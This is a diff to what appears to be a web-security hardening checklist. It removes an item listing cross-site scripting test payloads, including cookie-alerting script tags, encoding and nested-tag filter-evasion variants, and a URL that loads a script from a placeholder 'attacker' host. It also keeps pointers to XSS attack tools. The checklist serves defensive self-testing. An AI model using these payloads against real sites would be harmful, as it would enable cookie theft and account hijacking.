@@ -30,15 +30,6 @@ A bit barebones, but essentially a list of things to be aware of to try to secur
     )	&#41;
     #	&#35;
     ```
-16. Try attacking my own site with these (or just the full list [here](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)):
-    ```
-    "><script >alert(document.cookie)</script >
-    "><ScRiPt>alert(document.cookie)</ScRiPt>
-    "%3cscript%3ealert(document.cookie)%3c/script%3e
-    <scr<script>ipt>alert(document.cookie)</script>
-    http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
-    http://example/page.php?param=<script&param=>[...]</&param=script>
-    ```
 17. Use this attack tool? http://xss-proxy.sourceforge.net/
     Run this? https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
     Yet another XSS tool... https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework
